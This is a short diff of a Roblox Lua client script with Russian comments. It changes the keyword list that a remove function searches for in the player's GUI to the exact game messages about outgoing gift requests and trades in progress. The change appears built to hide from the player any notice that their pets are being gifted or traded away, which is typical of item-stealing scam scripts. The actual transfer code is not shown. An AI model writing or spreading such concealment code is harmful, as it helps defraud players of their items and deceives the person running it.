@@ -8,7 +8,7 @@ task.spawn(function()
     local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
     -- Слова для поиска
-    local keywords = {"gift", "sent", "pet", "give"}
+    local keywords = {"You already have a outgoing gift request for this pet!", "Sent gift request!", "Please wait until the last gift is finished!", "Your trade is processing, please wait until your trade finalizes before creating another one."}
 
     -- Проверка и удаление
     local function checkAndRemove(obj)
